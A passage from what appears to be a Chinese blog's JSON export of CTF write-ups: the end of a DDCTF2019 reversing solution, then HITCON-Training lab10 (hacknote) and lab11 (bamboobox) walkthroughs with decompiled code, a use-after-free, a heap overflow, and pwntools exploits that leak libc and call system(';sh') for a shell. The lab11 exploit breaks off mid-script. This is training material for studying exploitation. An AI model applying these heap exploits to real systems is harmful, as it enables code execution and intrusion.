class=\"number\">1</span>]</span><br><span class=\"line\">\tindex += <span class=\"number\">2</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func8</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num0 &gt;= <span class=\"number\">0x41</span> <span class=\"keyword\">and</span> num0 &lt;= <span class=\"number\">0x5a</span>:</span><br><span class=\"line\">\t\tv5 = (<span class=\"number\">2</span> + num0 - <span class=\"number\">65</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span></span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> num0 &gt;= <span class=\"number\">0x61</span> <span class=\"keyword\">and</span> num0 &lt;= <span class=\"number\">0x7a</span>:</span><br><span class=\"line\">\t\tv5 = (<span class=\"number\">2</span> + num0 - <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tv5 = num0</span><br><span class=\"line\">\tnum0 = v5</span><br><span class=\"line\">\tindex += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>​    实际上，magic bytes中每个\\xf0后面跟的都是0x10，所以我们将每个\\xf0后跟的第二个字节根据func8的逻辑进行变换，即可得到最后的flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, mark <span class=\"keyword\">in</span> enumerate(magic):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ord(mark) == <span class=\"number\">0xf0</span> <span class=\"keyword\">and</span> ord(magic[i+<span class=\"number\">1</span>]) == <span class=\"number\">0x10</span>:</span><br><span class=\"line\">\t\tnum = ord(magic[i+<span class=\"number\">2</span>])</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> num &gt;= <span class=\"number\">0x41</span> <span class=\"keyword\">and</span> num &lt;= <span class=\"number\">0x5a</span>:</span><br><span class=\"line\">\t\t\tnum = (<span class=\"number\">2</span> + num - <span class=\"number\">65</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">elif</span> num &gt;= <span class=\"number\">0x61</span> <span class=\"keyword\">and</span> num &lt;= <span class=\"number\">0x7a</span>:</span><br><span class=\"line\">\t\t\tnum = (<span class=\"number\">2</span> + num - <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tnum = num</span><br><span class=\"line\">\t\tflag += chr(num)</span><br><span class=\"line\"><span class=\"keyword\">print</span> flag</span><br></pre></td></tr></table></figure>\n<p>flag如下：<br>DDCTF{helloYouGotTheFlag}</p>\n","text":"本次DDCTF2019抱着玩一玩的心态参与了一下，事先不知道Pwn的题目这么少，RE的题目也不算多（主要RE的难题我不会做，简单题又比较水），所以就一开始做了两天，后续没有再尝试，最后排名100多位。下面简单总结一下Pwn和RE几道题的writeup。Pwnpwn只有一道题目St","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"},{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]},{"title":"HITCON_training题解(二)","slug":"HITCON-training-2","date":"2019-04-10T06:47:59.000Z","updated":"2019-04-10T06:58:06.000Z","comments":true,"path":"api/articles/HITCON-training-2.json","excerpt":"","keywords":null,"cover":null,"content":"<h2 id=\"Lab10——hacknote\"><a href=\"#Lab10——hacknote\" class=\"headerlink\" title=\"Lab10——hacknote\"></a>Lab10——hacknote</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>可以看到本题开启了canary和nx，这时想在栈上进行利用就相当困难了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab10$ checksec hacknote</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab10/hacknote&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>本题是一道典型的堆菜单题，共有4个选项</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. Add note          </span><br><span class=\"line\">2. Delete note       </span><br><span class=\"line\">3. Print note        </span><br><span class=\"line\">4. Exit</span><br></pre></td></tr></table></figure>\n<h4 id=\"add-note\"><a href=\"#add-note\" class=\"headerlink\" title=\"add note\"></a>add note</h4><p>逆向可以得到note的结构如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct note&#123;</span><br><span class=\"line\">\tDWORD *funcptr;</span><br><span class=\"line\">\tDWORD *content;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>每次执行add note操作会malloc两个chunk，首先会malloc(0x8)存储note结构体，将指针存在bss段的全局指针数组notelist；然后会根据输入的size，malloc(size)的chunk，并向其中读入size大小的数据。一个指向print_note_content函数的函数指针funcptr和指向存储数据的chunk的指针content会被存储在note结构体中。</p>\n<h4 id=\"del-note\"><a href=\"#del-note\" class=\"headerlink\" title=\"del note\"></a>del note</h4><p>首先读入符合要求的index，如果相应的数组项不为NULL，就会<em>依次free掉存储content的chunk和存储note的chunk</em>。注意这里存在UAF漏洞，并没有将notelist上存储的指向note的野指针置为NULL，所以即使在free后我们也可以任意的对这些指针进行解引用。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"title\">del_note</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [esp+4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [esp+8h] [ebp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [esp+Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Index :\"</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">4u</span>);</span><br><span class=\"line\">  v1 = atoi(&amp;buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt;= count )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Out of bound!\"</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( notelist[v1] )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)notelist[v1] + <span class=\"number\">1</span>)); &lt;= uaf vul</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(notelist[v1]);\t\t\t\t\t\t\t\t\t&lt;= uaf vul</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Success\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"print-note\"><a href=\"#print-note\" class=\"headerlink\" title=\"print note\"></a>print note</h4><p>该功能中会调用note结构体中存储的print_note_content函数指针，打印出content的内容。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( notelist[v1] )</span><br><span class=\"line\">  (*(<span class=\"keyword\">void</span> (__cdecl **)(<span class=\"keyword\">void</span> *))notelist[v1])(notelist[v1]);</span><br><span class=\"line\"><span class=\"keyword\">return</span> __readgsdword(<span class=\"number\">0x14</span>u) ^ v3;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">cdecl <span class=\"title\">print_note_content</span><span class=\"params\">(<span class=\"keyword\">int</span> a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(*(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **)(a1 + <span class=\"number\">4</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>实际上，该题中预留了一个magic函数，直接劫持函数指针到magic函数就可以实现利用。为了实现劫持，我们需要构造一个类型混淆的效果，即能够向note结构体里写内容。因为我们只能向content结构体写，所以我们需要利用uaf漏洞构造一个类似的效果。</p>\n<p>首先malloc两个size为0x10的note，然后del掉index0的chunk，此时size为0x8的fastbin中有两个chunk，size为0x10的fastbin中有两个chunk。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fd -&gt; note2(chunk2)-&gt;note(chunk0)</span><br><span class=\"line\">fd -&gt; content2(chunk3) -&gt; content(chunk1)</span><br></pre></td></tr></table></figure>\n<p>然后再malloc一个size为0x8的note，就会将两个size为0x8的chunk从fastbin上取下来，而chunk0则作为index2的content，也就是index0的note。所以我们就可以通过向index2的content中写来修改index0的note，也就可以劫持函数指针了。</p>\n<p>利用代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic = <span class=\"number\">0x8048986</span></span><br><span class=\"line\">add(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(magic) + p32(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<h3 id=\"提高\"><a href=\"#提高\" class=\"headerlink\" title=\"提高\"></a>提高</h3><p>我们给该题加大难度，假设不存在magic函数，或者说我们想要直接RCE执行任意指令，那应该怎么办呢？</p>\n<p>第一步应该是leak libc，我们可以利用和上述类似的思路，将函数指针覆盖为原来的print_note_content函数，将content覆盖为got表的指针，从而leak出got表。</p>\n<p>第二步是将函数指针覆盖为system，将content覆盖为/bin/sh，然后getshell。</p>\n<p>这里有两个难点：</p>\n<ul>\n<li>因为这道菜单题没有edit函数，所以我们可以直接free掉那两个0x8的chunk然后在重新申请的时候布置堆块内容即可。</li>\n<li>如果直接输入/bin/sh，由于前面有一些杂乱的数据，会使得shell命令执行失败。我们可以用”||”或者”;”截断，然后直接用sh即可。因为有些环境中，/bin本来就在环境变量中，所以直接用sh也可以。这里如果用<code>;/bin/sh\\x00</code>，就会超过8个byte，所以我们只能用<code>;sh\\x00</code>碰碰运气。幸运的是，我们成功了。</li>\n</ul>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"size :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(len(content)))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Content :\"</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice :\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">print_ = <span class=\"number\">0x804865b</span></span><br><span class=\"line\">got = elf.got[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">add(<span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">del_note(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p32(print_) + p32(got)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u32(p.recvuntil(<span class=\"string\">\"\\xf7\"</span>)[<span class=\"number\">-4</span>:])</span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">del_note(<span class=\"number\">2</span>)</span><br><span class=\"line\">payload = p32(system) + <span class=\"string\">\";sh\\x00\"</span></span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">print_note(<span class=\"number\">0</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab11——Bamboobox\"><a href=\"#Lab11——Bamboobox\" class=\"headerlink\" title=\"Lab11——Bamboobox\"></a>Lab11——Bamboobox</h2><h3 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>该题终于是一道64位的题了，仍旧开启了canary和nx，没有开启pie。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab11$ checksec bamboobox</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab11/bamboobox&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-1\"><a href=\"#分析-1\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>仍旧是标准菜单题，该题有五个功能，即增删改查和退出。</p>\n<p>该题漏洞位于change_item函数中：</p>\n<p>虽然在申请chunk的时候是根据输入的size进行malloc操作，但并没有存储size，所以在change的时候未对size进行校验，而是根据此次指定的长度对堆进行写入，也就是存在一个潜在的堆任意写漏洞。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> __<span class=\"function\">int64 <span class=\"title\">change_item</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v0; <span class=\"comment\">// ST08_4</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// [rsp+4h] [rbp-2Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [rsp+10h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> nptr; <span class=\"comment\">// [rsp+20h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+28h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( num )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the index of item:\"</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">    v2 = atoi(&amp;buf);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(_QWORD *)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the length of item name:\"</span>, &amp;buf);</span><br><span class=\"line\">      read(<span class=\"number\">0</span>, &amp;nptr, <span class=\"number\">8u</span>LL);</span><br><span class=\"line\">      v0 = atoi(&amp;nptr);</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please enter the new name of the item:\"</span>, &amp;nptr);</span><br><span class=\"line\">      *(_BYTE *)(*(_QWORD *)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>] + (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)read(<span class=\"number\">0</span>, *(<span class=\"keyword\">void</span> **)&amp;itemlist[<span class=\"number\">4</span> * v2 + <span class=\"number\">2</span>], v0)) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">\"invaild index\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"No item in the box\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v5;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>该题也是采用全局变量管理堆块指针，将申请chunk的size和对应指针依次存放在bss段。也就是说，如果我们能够修改bss段的指向chunk的指针为任意地址，我们也就可以利用show和edit函数实现任意地址读写。</p>\n<h3 id=\"利用-1\"><a href=\"#利用-1\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>根据上述分析，要实现bss段修改，结合该题的堆溢出漏洞，构造一个unlink利用来使得bss段上的chunk指针向前移动0x18个byte，然后修改chunk指针，实现任意地址读写，从而leak处libc，再劫持atoi@got（malloc_hook和free_hook似乎也可以）为one_gadget从而getshell。</p>\n<p>注意unlink利用有如下要点：</p>\n<ul>\n<li>需要在free时触发前向或后向合并，条件有：<ul>\n<li>free的堆块位于unsorted bin范围内（64位最小为0x80）</li>\n<li>free的堆块的前一个或后一个堆块未被使用（被free），这根据当前chunk的prev_inuse位判断，并且需要构造prev_size，在当前chunk的地址 - prev_size的位置布置一个fake chunk</li>\n<li>fake chunk需要保证fake chunk的next chunk的prev_size和自己的size相同</li>\n</ul>\n</li>\n<li>野指针需要指向被合并的fake chunk的user_data区间，然后从user_data部分开始构造fake chunk</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bamboobox\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./bamboobox\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span 